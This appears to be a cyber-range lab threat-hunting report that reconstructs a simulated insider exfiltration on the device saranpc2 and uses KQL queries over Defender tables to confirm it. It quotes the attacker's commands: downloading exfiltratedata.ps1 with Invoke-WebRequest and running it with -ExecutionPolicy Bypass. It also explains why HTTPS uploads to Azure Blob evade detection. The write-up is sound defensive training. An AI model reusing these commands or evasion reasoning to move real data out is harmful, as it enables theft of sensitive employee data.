# ⏱️ Attack Timeline Reconstruction

**Device:** `saranpc2` (John Doe's corporate device)  
**Hunt Date:** March 28, 2026  
**Analyst:** Saran

---

## Timeline of Events

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[PRE-INCIDENT]
    📌 CONTEXT: Employee on Performance Improvement Plan (PIP)
    ─────────────────────────────────────────────────────────────────
    John Doe, working in a sensitive department, is placed on a
    Performance Improvement Plan (PIP). Following a confrontation
    with management, concerns are raised about possible data theft.
    
    Risk factors present:
    ┌────────────────────────────────────────────────────────────┐
    │ • John has local admin rights on saranpc2                  │
    │ • No application restrictions in place                     │
    │ • John has legitimate access to sensitive company data      │
    │ • No DLP solution deployed                                 │
    │ • PowerShell unrestricted, no Script Block Logging         │
    └────────────────────────────────────────────────────────────┘
    
    Status: Pre-existing security gaps — no detection in place

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T — SCRIPT DELIVERY]
    📌 EVENT: exfiltratedata.ps1 Downloaded to Device
    ─────────────────────────────────────────────────────────────────
    The following command is executed on saranpc2:
    
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/[...]/
    exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'
    
    The script is downloaded to C:\programdata\ — a writable system
    directory that does not require elevated privileges to write to.
    
    Source: DeviceFileEvents (FileCreated — exfiltratedata.ps1)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T + SECONDS]
    📌 EVENT: Script Executed with Execution Policy Bypass
    ─────────────────────────────────────────────────────────────────
    Immediately after download, the script is executed:
    
    cmd /c powershell.exe -ExecutionPolicy Bypass -File
    C:\programdata\exfiltratedata.ps1
    
    Key indicators:
    • -ExecutionPolicy Bypass: deliberate circumvention of PowerShell
      security controls
    • cmd.exe launching PowerShell: common staging pattern
    • C:\programdata\: non-standard script location
    
    Source: DeviceProcessEvents (ProcessCommandLine)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T + SECONDS]
    📌 EVENT: 7-Zip Silently Installed by Script
    ─────────────────────────────────────────────────────────────────
    exfiltratedata.ps1 silently downloads and installs 7-Zip (7z.exe)
    on saranpc2. No UAC prompt or user notification is displayed.
    
    7-Zip is a legitimate, widely trusted tool — it does not trigger
    AV or EDR detections.
    
    Source: DeviceProcessEvents (7z.exe installation event)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T + SECONDS TO MINUTES]
    📌 EVENT: Sensitive Data Compressed into Archives
    ─────────────────────────────────────────────────────────────────
    7-Zip is invoked by the script to compress sensitive company files
    — including employee-data.csv — into .zip / .7z archive files.
    
    Archive characteristics:
    ┌────────────────────────────────────────────────────────────┐
    │ • Format: .zip and .7z                                     │
    │ • Contents: employee-data.csv and other sensitive files    │
    │ • Created by: powershell.exe (via 7z.exe)                  │
    │ • Location: non-standard paths                             │
    └────────────────────────────────────────────────────────────┘
    
    Source: DeviceFileEvents (FileCreated — .zip/.7z events)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[T + MINUTES]
    📌 EVENT: Archives Uploaded to Azure Blob Storage
    ─────────────────────────────────────────────────────────────────
    The script uploads the compressed archives to an external Azure
    Blob Storage account via HTTPS.
    
    Connection details:
    ┌────────────────────────────────────────────────────────────┐
    │ Destination: sacyberrange00.blob.core.windows.net          │
    │ IP Address:  20.60.181.193                                 │
    │ Port:        443 (HTTPS — encrypted)                       │
    │ Protocol:    TLS — content invisible to network monitoring │
    │ ActionType:  ConnectionSuccess — upload confirmed          │
    │ Initiator:   powershell.exe (exfiltratedata.ps1)           │
    └────────────────────────────────────────────────────────────┘
    
    Why HTTPS/Azure Blob was chosen:
    • Port 443 is permitted through virtually all firewalls
    • Azure Blob is a trusted Microsoft domain — not blocked
    • Encrypted traffic cannot be inspected without SSL interception
    • Indistinguishable from legitimate cloud backup activity
    
    Source: DeviceNetworkEvents (ConnectionSuccess)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[UNKNOWN — NOT OBSERVED]
    📌 POTENTIAL: Post-Exfiltration Cleanup (T1070.004)
    ─────────────────────────────────────────────────────────────────
    Not directly observed, but a common follow-up step would be:
    • Delete archive files from saranpc2
    • Delete or overwrite the exfiltratedata.ps1 script
    • Clear PowerShell history
    
    Note: MDE retains file deletion events in DeviceFileEvents —
    cleanup does not destroy forensic evidence in MDE logs.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-27 — HUNT INITIATED]
    📌 EVENT: Security Team Begins Investigation
    ─────────────────────────────────────────────────────────────────
    Management raises concerns about John Doe following a
    confrontation over his PIP. Security team is asked to review
    activity on saranpc2.
    
    Hypothesis:
    "John may be using admin rights to archive and exfiltrate
    sensitive company data before resigning."
    
    Key tables identified:
    - DeviceFileEvents
    - DeviceProcessEvents
    - DeviceNetworkEvents

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-27 — QUERY 1]
    📌 ANALYSIS: Archive File Detection
    ─────────────────────────────────────────────────────────────────
    DeviceFileEvents
    | where DeviceName == "saranpc2"
    | where FileName endswith ".zip"
    
    ✅ Multiple .zip creation events found
    ✅ Initiated by powershell.exe — suspicious
    ✅ Timestamps noted for pivoting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-27 — QUERY 2]
    📌 PIVOT: Process Events ±1 minute of archive creation
    ─────────────────────────────────────────────────────────────────
    DeviceProcessEvents
    | where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
    | where DeviceName == "saranpc2"
    
    ✅ exfiltratedata.ps1 discovered
    ✅ powershell.exe -ExecutionPolicy Bypass confirmed
    ✅ 7-Zip silently installed by the script
    ✅ employee-data.csv being archived

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-27 — QUERY 3]
    📌 PIVOT: Network Events — Upload Confirmed
    ─────────────────────────────────────────────────────────────────
    DeviceNetworkEvents
    | where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
    | where DeviceName == "saranpc2"
    
    ✅ ConnectionSuccess to sacyberrange00.blob.core.windows.net
    ✅ IP: 20.60.181.193 | Port: 443 | HTTPS
    ✅ Initiated by powershell.exe running exfiltratedata.ps1
    ✅ EXFILTRATION CONFIRMED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-27 — QUERY 4]
    📌 VERIFICATION: USB Exfiltration Check
    ─────────────────────────────────────────────────────────────────
    DeviceFileEvents
    | where FolderPath matches regex @"^[E-J]:\\"
    
    ✅ No results — No USB/removable drive exfiltration detected

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[2026-03-27 — VERDICT & ESCALATION]
    📌 CONCLUSION: Exfiltration Confirmed — Escalated to Management
    ─────────────────────────────────────────────────────────────────
    ✅ Data exfiltration confirmed on saranpc2
    ✅ Sensitive employee data (employee-data.csv) archived and uploaded
    ✅ Destination: Azure Blob Storage (sacyberrange00.blob.core.windows.net)
    ✅ Script: exfiltratedata.ps1 with -ExecutionPolicy Bypass
    ✅ Account: labuser (John Doe's corporate account)
    ✅ USB exfiltration: ruled out
    ✅ Findings escalated to John's manager with full evidence package

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Why This Was So Hard to Detect

| Factor | Why It Helped the Attacker |
|---|---|
| Used legitimate tools | 7-Zip and PowerShell don't trigger AV |
| HTTPS on port 443 | Encrypted, universally permitted |
| Azure Blob Storage | Trusted Microsoft domain — not blocked |
| Admin rights on device | Silent install, no UAC alerts |
| No DLP deployed | No content inspection on outbound data |
| No PowerShell logging | Script content not captured in real time |
| Legitimate account used | No authentication anomalies to alert on |

---

## Key Evidence Reference

| Evidence | Timestamp | Source Table |
|---|---|---|
| `exfiltratedata.ps1` created in `C:\programdata\` | T | `DeviceFileEvents` |
| `powershell.exe -ExecutionPolicy Bypass` executed | T | `DeviceProcessEvents` |
| `7z.exe` silently installed | T + seconds | `DeviceProcessEvents` |
| `.zip` archives created from `employee-data.csv` | T + seconds | `DeviceFileEvents` |
| `ConnectionSuccess` to `sacyberrange00.blob.core.windows.net:443` | T + minutes | `DeviceNetworkEvents` |
| USB/removable drive check — no results | — | `DeviceFileEvents` |
| Findings escalated to management | 2026-03-27 | — |

---

*Timeline reconstructed by: Saran | CyberRange Lab | March 27, 2026*
